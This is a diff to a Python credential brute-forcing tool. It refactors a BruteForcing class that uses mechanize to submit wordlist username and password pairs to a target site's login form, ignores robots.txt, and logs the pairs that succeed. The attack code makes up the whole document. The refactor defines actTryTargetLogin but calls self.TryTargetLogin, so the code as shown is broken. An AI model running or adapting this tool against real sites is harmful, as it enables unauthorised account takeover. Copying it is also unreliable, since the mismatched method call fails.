@@ -60,8 +60,32 @@ class BruteForcing(object):
 	def actGetResult(self):
 		return self.fndData
 
+	def actTryTargetLogin(self, browserObject, tryUsername, tryPassowrd, count):
+		try:
+			browserObject.select_form(nr = self.frmLoginID)
+			browserObject.form[self.frmUserField] = tryUsername
+			browserObject.form[self.frmPassField] = tryPassowrd
+			utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassowrd, '=' * 6, count, self.szPassword))
+			req = browserObject.submit()
+			browserObject.reload()
+			if not actions.action_getFormInformation(browserObject.forms()):
+				utils.printf("Found: %s:%s" %(tryUsername, tryPassowrd), "good")
+				self.fndData.append([tryUsername, tryPassowrd])
+				return True
+			return False
+
+		except mechanize.HTTPError as error:
+			sys.exit(utils.craf_msg(error, "bad"))
+
 	def run(self):
 		#Start brute forcing
+		###############################
+		#	Testing, does not need
+		try:
+			self.lstUsername.seek(0)
+		except:
+			pass
+
 		for idxUsername in self.lstUsername:
 
 			count = 0
@@ -72,25 +96,21 @@ class BruteForcing(object):
 			proc.set_handle_robots(False)
 			proc.open(self.varTargetURL)
 
-			self.lstPassword.seek(0)
+			#######################################
+			#	Read password file from start point
+			#
+			#######################################
+			try:
+				self.lstPassword.seek(0)
+			except:
+				pass
+
 			for idxPasswd in self.lstPassword:
 				idxPasswd = idxPasswd.replace('\n', '')
 
-				try:
-					proc.select_form(nr = self.frmLoginID)
-					proc.form[self.frmUserField] = idxUsername
-					proc.form[self.frmPassField] = idxPasswd
-					count += 1
-					utils.prints("%10s : %20s%12s%10s / %10s" %(idxUsername, idxPasswd, '=' * 6, count, self.szPassword))
-					req = proc.submit()
-					proc.reload()
-					if not actions.action_getFormInformation(proc.forms()):
-						utils.printf("Found: %s:%s" %(idxUsername, idxPasswd), "good")
-						self.fndData.append([idxUsername, idxPasswd])
-						break
-
-				except mechanize.HTTPError as error:
-					sys.exit(utils.craf_msg(error, "bad"))
+				count += 1
+				if self.TryTargetLogin(proc, idxUsername, idxPasswd, count):
+					break
 
 			if count == self.szPassword:
 				utils.printf("%s: No match found." %(idxUsername), "bad")
